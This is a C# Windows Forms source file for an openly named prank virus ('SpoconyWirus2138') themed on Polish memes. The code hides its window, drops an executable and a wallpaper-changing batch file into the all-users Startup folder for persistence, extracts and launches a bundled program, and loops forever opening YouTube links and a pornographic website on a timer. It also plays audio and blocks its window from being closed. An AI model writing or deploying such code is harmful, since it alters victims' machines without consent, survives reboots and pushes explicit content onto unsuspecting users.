using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.IO.Compression;

namespace SpoconyWirus2138
{
    public partial class Papaj : Form
    {
        public bool playingAudio;
        public Papaj()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackgroundImage = Papiezowe.Properties.Resources.JP2;
            this.BackgroundImageLayout = BackgroundImageLayout = ImageLayout.Stretch;

            File.WriteAllBytes(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\2137.exe", Papiezowe.Properties.Resources.AmogUs);

            if (!Directory.Exists(@"C:\SARS"))
                Directory.CreateDirectory(@"C:\SARS");

            File.WriteAllBytes(@"C:\SARS\temp.zip", Papiezowe.Properties.Resources.Sonic_Adventures___ReSpinned_);
            ZipFile.ExtractToDirectory(@"C:\SARS\temp.zip", @"C:\SARS\");

            File.WriteAllBytes(@"C:\Wersow.png", Papiezowe.Properties.Resources.wallpp);
            File.WriteAllBytes(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ChangeWallpp.bat", Papiezowe.Properties.Resources.WallppChange1);

            Process.Start(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ChangeWallpp.bat");

            new Thread(() =>
            {
                DialogResult dra = MessageBox.Show("Among Us", "Sus", MessageBoxButtons.OK);
                SoundPlayer amogus = new SoundPlayer(Papiezowe.Properties.Resources.Among_Us_Trap_Remix__2___online_audio_converter_com_);
                amogus.Play();
            }).Start();

            new Thread(() =>
            {
                while (3 > 2)
                {
                    DateTime dt = DateTime.Now;
                    SoundPlayer sp = new SoundPlayer(Papiezowe.Properties.Resources.Jason_Pawulo___Jebał_reupload___online_audio_converter_com_);

                    if (dt.Minute % 2 == 0)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                                UseShellExecute = true
                            });
                            Thread.Sleep(5000);
                        }
                        catch (Exception)
                        {

                        }
                    }

                    if (dt.Minute % 3 == 0)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "https://www.youtube.com/watch?v=xXd8IN1uL7Y",
                                UseShellExecute = true
                            });
                            Thread.Sleep(5000);
                        }
                        catch (Exception)
                        {

                        }
                    }

                    if (dt.Minute % 5 == 0)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "http://www.pornhub.com",
                                UseShellExecute = true
                            });
                            Thread.Sleep(5000);
                        }
                        catch (Exception)
                        {

                        }
                    }

                    if (dt.Minute % 10 == 0)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = @"C:\SARS\Sonic Adventures - ReSpinned!.exe",
                                UseShellExecute = true
                            });
                            Thread.Sleep(5000);
                        }
                        catch (Exception)
                        {

                        }
                    }

                    if (dt.ToString("HH:mm") == "21:36" && playingAudio == false || dt.ToString("HH:mm") == "21:38" && playingAudio == false || dt.ToString("HH:mm") == "21:39" && playingAudio == false)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "http://www.iledopapiezowej.pl",
                            UseShellExecute = true
                        });
                        Thread.Sleep(30000);
                    }

                    if (dt.ToString("HH:mm") == "21:37" && playingAudio == false || dt.ToString("HH:mm") == "21:38" && playingAudio == false || dt.ToString("HH:mm") == "21:39" && playingAudio == false)
                    {
                        DialogResult dr = MessageBox.Show("Idź po kremówke i papieżuj z nami :D", "Spocony Maciuś 2137 - Pro Fortnite Player", MessageBoxButtons.OK);
                        playingAudio = true;
                        sp.Play();
                        Thread.Sleep(5000);
                        WindowState = FormWindowState.Maximized;
                    }
                    if (dt.ToString("HH:mm") == "21:40" && playingAudio == true)
                    {
                        playingAudio = false;
                        sp.Stop();
                        WindowState = FormWindowState.Minimized;
                        DialogResult dr = MessageBox.Show("Już po 21:37 - widzimy się jutro :)", "Spocony Maciuś 2137 - Pro Fortnite Player", MessageBoxButtons.OK);
                    }
                }
            }).Start();
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (string.Equals((sender as Button).Name, @"CloseButton")) { }
            // Do something proper to CloseButton.
            else {
                e.Cancel = true;
            }
        }
    }
    }

